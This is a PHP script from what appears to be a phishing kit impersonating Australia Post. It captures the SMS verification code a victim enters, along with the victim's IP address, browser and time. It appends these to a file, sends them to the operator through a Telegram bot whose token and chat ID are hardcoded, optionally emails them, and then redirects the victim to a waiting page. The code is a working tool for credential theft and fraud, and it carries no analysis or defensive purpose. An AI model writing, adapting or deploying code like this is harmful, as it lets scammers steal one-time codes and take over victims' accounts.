<?php

session_start();
include '../mine.php';
$InfoDATE   = date("d-m-Y h:i:sa");
$UserAgent =$_SERVER['HTTP_USER_AGENT'];
$browser = explode(')',$UserAgent);				
$_SESSION['browser'] = $browserTy_Version =array_pop($browser); 	

$sms = $_SESSION['sms'] = $_POST['sms'];

$msg .= '
[+]━━━━━━━━━━━━━━━━━━【📲 SMS１📲】━━━━━━━━━━━━━━━━━━━[+]
[💬 SMS１ ] = '.$_SESSION['sms'].'
[+][💻 System INFO][+]
[🔍 IP INFO] = http://www.geoiptool.com/?IP='.$_SERVER['REMOTE_ADDR'].'
[⏰ TIME/DATE] ='.$InfoDATE.'
[🌐 BROWSER] = '.$_SESSION['browser'] .$_SESSION['os'].'
[+]━━━━━━━━━━━━━━━━━━【AUSPOST】━━━━━━━━━━━━━━━━━━━━[+]
[+]━━━━━━━━━━━━━━━【By TOPY-31 🖕🤡🖕】━━━━━━━━━━━━━━[+]';
		if ($saveintext=="yes") {
	$save=fopen("../../".$filename.".txt","a+");
fwrite($save,$msg);
file_get_contents("https://api.telegram.org/bot5536467841:AAGxVnjUbwO4IHAYDB3q3CXhSOtYqY26NqM/sendMessage?chat_id=-699813202&text=" . urlencode($msg)."" );
fclose($save);
}
$subject="-".$scamname."- AUSPOST-SMS1 From [{$_SESSION['lname']}]";
$headers="From: AUSPOST-SMS1 <newsms1@topysms1.com>\r\n";
$headers.="MIME-Version: 1.0\r\n";
$headers.="Content-Type: text/plain; charset=UTF-8\r\n";
	if ($sendtoemail=="yes") {
	@mail($yours,$subject,$msg,$headers);
	}

?>
<html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<script language="javascript">
var page = "../../app/wait.php"          
top.location = page;
</script> 
</head>
</html>